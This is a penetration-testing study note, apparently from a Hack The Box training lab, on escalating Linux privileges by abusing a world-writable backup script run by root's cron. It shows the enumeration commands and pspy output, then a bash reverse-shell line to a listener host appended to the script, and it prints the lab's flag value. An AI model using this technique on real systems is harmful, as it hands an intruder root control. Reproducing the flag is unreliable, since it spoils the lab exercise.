---
description: >-
  Typically used for administrative tasks such as running backups, cleaning up
  directories, etc.
---

# Cron Job Abuse

* `crontab` command crates cron file which will run by cron deamon on the schedule specified.
* cron file will be created in /var/spool/cron for specific user that crteates it
* crontab file requires six items in the following order:&#x20;
  * **minutes, hours, days, months, weeks, commands.**
  * `0 */12 * * * /home/admin/backup.sh`
* crontab is usually editable by root user or user with full sudo privileges
* we may find a world-writable script that runs as root
* Certain applications create cron files in the `/etc/cron.d` directory and may be misconfigured to allow a non-root user to edit them.

First, let's look around the system for any writeable files or directories.&#x20;

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control

<SNIP>
/home/backupsvc/backup.sh

<SNIP>
```

The file `backup.sh` in the `/dmz-backups` directory is interesting and seems like it could be running on a cron job.

```shell-session
ls -la /dmz-backups/

total 36
drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..
-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh
-rw-r--r--  1 root root 3336 Aug 31 02:24 www-backup-2020831-02:24:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:27 www-backup-2020831-02:27:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:30 www-backup-2020831-02:30:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:33 www-backup-2020831-02:33:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:36 www-backup-2020831-02:36:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:39 www-backup-2020831-02:39:01.tgz
```

* `/dmz/backups` directory shows what appears to be files created every three minutes.
* Perhaps the sysadmin meant to specify every three hours like `0 */3 * * *` but instead wrote `*/3 * * * *`, which tells the cron job to run every three minutes.
* `backup.sh` shell script is world writeable and runs as root.

confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges. (It works by scanning [procfs](https://en.wikipedia.org/wiki/Procfs).)

```shell-session
./pspy64 -pf -i 1000

pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2020/09/04 20:45:03 CMD: UID=0    PID=999    | /usr/bin/VGAuthService 
2020/09/04 20:45:03 CMD: UID=111  PID=990    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation 
2020/09/04 20:45:03 CMD: UID=0    PID=99     | 
2020/09/04 20:45:03 CMD: UID=0    PID=988    | /usr/lib/snapd/snapd 

<SNIP>

2020/09/04 20:45:03 CMD: UID=0    PID=1017   | /usr/sbin/cron -f 
2020/09/04 20:45:03 CMD: UID=0    PID=1010   | /usr/sbin/atd -f 
2020/09/04 20:45:03 CMD: UID=0    PID=1003   | /usr/lib/accountsservice/accounts-daemon 
2020/09/04 20:45:03 CMD: UID=0    PID=1001   | /lib/systemd/systemd-logind 
2020/09/04 20:45:03 CMD: UID=0    PID=10     | 
2020/09/04 20:45:03 CMD: UID=0    PID=1      | /sbin/init 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh 
2020/09/04 20:46:01 CMD: UID=0    PID=2200   | /bin/sh -c /dmz-backups/backup.sh 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:01 CMD: UID=0    PID=2199   | /usr/sbin/CRON -f 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2203   | 
2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2205   | gzip 
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:03 CMD: UID=0    PID=2206   | /bin/bash /dmz-backups/backup.sh 
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
```

* `backup.sh` script is creating a tarball file of the contents of the `/var/www/html` directory.
* append a command to it to attempt to obtain a reverse shell as root.
  * If editing a script, make sure to `ALWAYS` take a copy of it and/or create a backup.
  * append our commands to the end of the script to still run properly before executing our reverse shell command.

```shell-session
cat /dmz-backups/backup.sh 

#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

* script is just taking in a source and destination directory as variables

modify the script to add a [Bash one-liner reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

stand up a local `netcat` listener, and wait. Sure enough, within three minutes, we have a root shell!

```shell-session
nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882
bash: cannot set terminal process group (9143): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id
id
uid=0(root) gid=0(root) groups=0(root)

root@NIX02:~# hostname
hostname
NIX02
```

## Assessment

Connect to the target system and escalate privileges by abusing the misconfigured cron job. Submit the contents of the flag.txt file in the /root/cron\_abuse directory.

```
htb-student@NIX02:~$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
<SNIP>

/home/backupsvc/backup.sh

<SNIP>
```

```
htb-student@NIX02:~$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/07/16 12:27:14 CMD: UID=1008  PID=1605   | ./pspy64 
<SNIP>
2023/07/16 12:27:14 CMD: UID=1008  PID=1481   | -bash 
2023/07/16 12:27:14 CMD: UID=1008  PID=1478   | sshd: htb-student@pts/0
2023/07/16 12:27:14 CMD: UID=1008  PID=1419   | (sd-pam)   
2023/07/16 12:27:14 CMD: UID=1008  PID=1417   | /lib/systemd/systemd --user 
2023/07/16 12:27:14 CMD: UID=0     PID=1415   | sshd: htb-student [priv]
2023/07/16 12:27:14 CMD: UID=33    PID=1369   | /usr/sbin/apache2 -k start 
2023/07/16 12:27:14 CMD: UID=33    PID=1368   | /usr/sbin/apache2 -k start 
2023/07/16 12:27:14 CMD: UID=33    PID=1367   | /usr/sbin/apache2 -k start 
2023/07/16 12:27:14 CMD: UID=33    PID=1366   | /usr/sbin/apache2 -k start 
2023/07/16 12:27:14 CMD: UID=33    PID=1365   | /usr/sbin/apache2 -k start 
2023/07/16 12:27:14 CMD: UID=0     PID=1352   | 
2023/07/16 12:27:14 CMD: UID=0     PID=1348   | /usr/sbin/apache2 -k start 
2023/07/16 12:27:14 CMD: UID=0     PID=1321   | /usr/sbin/irqbalance --pid=/var/run/irqbalance.pid 
2023/07/16 12:27:14 CMD: UID=0     PID=1304   | /sbin/agetty --noclear tty1 linux 
<SNIP>
2023/07/16 12:27:14 CMD: UID=112   PID=1212   | /usr/sbin/mysqld 
2023/07/16 12:27:14 CMD: UID=0     PID=1208   | /sbin/iscsid 
2023/07/16 12:27:14 CMD: UID=0     PID=1207   | /sbin/iscsid 
2023/07/16 12:27:14 CMD: UID=0     PID=1206   | /usr/sbin/rpc.mountd --manage-gids 
2023/07/16 12:27:14 CMD: UID=0     PID=1189   | /usr/sbin/sshd -D 
2023/07/16 12:27:14 CMD: UID=0     PID=1043   | /sbin/dhclient -1 -v -pf /run/dhclient.ens192.pid -lf /var/lib/dhcp/dhclient.ens192.leases -I -df /var/lib/dhcp/dhclient6.ens192.leases ens192                                                                                                                          
2023/07/16 12:27:14 CMD: UID=0     PID=1014   | 
2023/07/16 12:27:14 CMD: UID=0     PID=998    | /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog 
2023/07/16 12:27:14 CMD: UID=0     PID=995    | /usr/lib/policykit-1/polkitd --no-debug 
2023/07/16 12:27:14 CMD: UID=0     PID=980    | /usr/lib/snapd/snapd 
2023/07/16 12:27:14 CMD: UID=0     PID=974    | /usr/bin/lxcfs /var/lib/lxcfs/ 
2023/07/16 12:27:14 CMD: UID=0     PID=971    | /usr/bin/VGAuthService 
2023/07/16 12:27:14 CMD: UID=0     PID=968    | /usr/sbin/acpid 
2023/07/16 12:27:14 CMD: UID=1     PID=966    | /usr/sbin/atd -f 
2023/07/16 12:27:14 CMD: UID=104   PID=963    | /usr/sbin/rsyslogd -n 
2023/07/16 12:27:14 CMD: UID=0     PID=959    | /lib/systemd/systemd-logind 
2023/07/16 12:27:14 CMD: UID=0     PID=957    | /usr/lib/accountsservice/accounts-daemon 
2023/07/16 12:27:14 CMD: UID=107   PID=948    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation 
2023/07/16 12:27:14 CMD: UID=0     PID=945    | /usr/sbin/cron -f 
2023/07/16 12:27:14 CMD: UID=0     PID=924    | /sbin/rpcbind -f -w 
2023/07/16 12:27:14 CMD: UID=0     PID=824    | /usr/sbin/rpc.idmapd 
2023/07/16 12:27:14 CMD: UID=100   PID=814    | /lib/systemd/systemd-timesyncd 
2023/07/16 12:27:14 CMD: UID=0     PID=776    | /usr/bin/vmtoolsd 
2023/07/16 12:27:14 CMD: UID=0     PID=525    | vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid 
2023/07/16 12:27:14 CMD: UID=0     PID=519    | /lib/systemd/systemd-udevd 
2023/07/16 12:27:14 CMD: UID=0     PID=510    | /sbin/lvmetad -f 
<SNIP> 
2023/07/16 12:27:14 CMD: UID=0     PID=1      | /sbin/init 
2023/07/16 12:28:01 CMD: UID=0     PID=1618   | date +%-Y%-m%-d 
2023/07/16 12:28:01 CMD: UID=0     PID=1617   | /bin/bash /dmz-backups/backup.sh 
2023/07/16 12:28:01 CMD: UID=0     PID=1616   | /bin/sh -c /dmz-backups/backup.sh 
2023/07/16 12:28:01 CMD: UID=0     PID=1615   | /usr/sbin/CRON -f 
2023/07/16 12:28:01 CMD: UID=0     PID=1620   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-2023716-12:28:01.tgz /var/www/html 
2023/07/16 12:28:01 CMD: UID=0     PID=1621   | gzip
```

```bash
htb-student@NIX02:/dmz-backups$ echo "bash -i >& /dev/tcp/10.10.14.2/7890 0>&1" >> backup.sh 
htb-student@NIX02:/dmz-backups$ cat backup.sh 
#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
bash -i >& /dev/tcp/10.10.14.2/7890 0>&1
```

wait for 3 minuites and we got the shell as root

```bash
root@NIX02:~# cat /root/cron_abuse/flag.txt
cat /root/cron_abuse/flag.txt
14347a2c977eb84508d3d50691a7ac4b
```

